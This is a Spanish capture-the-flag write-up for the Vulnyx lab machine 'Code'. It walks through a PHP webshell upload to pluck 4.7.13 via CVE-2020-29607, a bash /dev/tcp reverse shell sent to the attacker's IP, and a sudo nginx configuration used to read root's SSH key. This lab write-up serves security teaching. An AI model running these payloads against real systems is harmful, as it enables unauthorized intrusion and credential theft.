---
title: Vulnyx - Code
author: estx
date: 2024-04-29 12:10:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'File Upload', 'Binary Abusing', 'Nginx']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Code/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **File Upload, Binary Abusing**

### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.71	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```

a. Enumeramos los puertos que están abiertos.

```bash
❯ nmap -p- -sS --min-rate 5000 -Pn -n 192.168.100.71 -oG ports

PORT     STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

b. Vemos las versiones de los servicios que se están ejecutando

```bash
❯ nmap -p22,80,8080 -sCV 192.168.100.71 -oN versions

PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

c. Al realizar un **fuzzing** encontramos el directorio `/pluck/`

```bash
❯ wfuzz -c -t 60 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://192.168.100.71/FUZZ'

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000011860:   301        9 L      28 W       316 Ch      "pluck"
```


* La por defecto para la autenticación es **admin**

d. En la página vemos la versión `pluck 4.7.13`, si investigamos por vulnerabilidades, encontramos [CVE-2020–29607](https://loopspell.medium.com/cve-2020-29607-remote-code-execution-via-file-upload-restriction-bypass-f5cff38d94c6). Aquí nos detallan que podemos subir una webshell con la extensión **`.phar`**

* `webshell.phar`

    ```php
    <?php
        system($_GET['cmd']);
    ?>
    ```

    ![File Upload](/assets/images/Vulnyx/Easy/Code/01-file.png)

* Ahora, ya nos podemos ejecutar comandos en la máquina víctima, con lo que nos entablaremos una reverse shell

```bash
❯ curl -s -X GET "http://192.168.100.71/pluck/files/webshell.phar?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.100.55/4444%200>%261'"
---------------------------------------------------------------
❯ nc -lvnp 4444
www-data@code:/var/www/html/pluck/files$
```

### Escalada de Privilegios 💹

1. Hacemos el tratamiento de la TTY para trabajar de manera más cómoda con la reverse shell

```bash
www-data@code:/var/www/html/pluck/files$ script /dev/null -c bash
www-data@code:/var/www/html/pluck/files$ ^Z
[1]  + 65418 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 65418 continued  nc -lvnp 4444
                                     reset xterm

www-data@code:/var/www/html/pluck/files$ export TERM=xterm-256color
www-data@code:/var/www/html/pluck/files$ source /etc/skel/.bashrc
```


2. Vemos los permisos a nivel de sudoers de este usuario

```bash
www-data@code:/var/www/html/pluck/files$ sudo -l
User www-data may run the following commands on code:
    (dave) NOPASSWD: /usr/bin/bash
www-data@code:/var/www/html/pluck/files$ sudo -u dave /usr/bin/bash
dave@code:/var/www/html/pluck/files$
```

3. Al explorar los archivos encontramos el archivo `pass.php`

```php
dave@code:/var/www/html/pluck/data/settings$ cat pass.php 
<?php
$ww = 'c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec';
//$ww = '$3cUr3_p4$$w0rD';
?>
```

* Vemos los permisos a nivel de sudoers de este usuario

```bash
dave@code:/var/www/html/pluck/data/settings$ sudo -l

User dave may run the following commands on code:
    (root) NOPASSWD: /usr/sbin/nginx
```

4. Podemos listar archivos privilegiados con un archivo de configuración `nginx.conf`

```bash
user root;
events {
    worker_connections 1024;
}
http {
  server {
    listen 65001;
    location / {
      root /root;
    }
  }
}
```

> ¿Por qué podemos listar archivos del usuario `root`? Debido a que el usuario que ejecutará este servicio es **root** podemos listar archivos privilegiados, en este caso el directorio es **/root**
{: .prompt-info }


* Ahora lo que haremos es levantar el servidor y obtener la clave id_rsa del usuario root

```bash
dave@code:/tmp$ sudo -u root /usr/sbin/nginx -c /tmp/nginx.conf
dave@code:/tmp$ wget -o- http://127.0.0.1:65001/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,FF710198BD382E23

Cznk3IjefeSBWuVoxabITqCi3f0u9yq0TT5z6uQpa0OImBb/I5Iiy7yvcicbz2AS
<SNIP>
jzdYJGJl4h4XHS0rc4yZHO3T433/o73dvnd9vRliCi0Up1bRfG+YhA==
-----END RSA PRIVATE KEY-----
```


5. Si tratamos de cracker el hash de la clave id_rsa no funcionará. Si recordamos, encontramos el archivo `pass.php` que contiene la credencial **$3cUr3_p4$$w0rD**

```bash
❯ chmod 600 id_rsa
❯ ssh root@192.168.100.71 -i id_rsa
Enter passphrase for key 'id_rsa': 
root@code:~# cat /root/.                         
root@code:~# cat /root/.read_the_roooooooooooooot.txt 
9d941d3649b0fbce0ba82c6d4dcfbb0f
```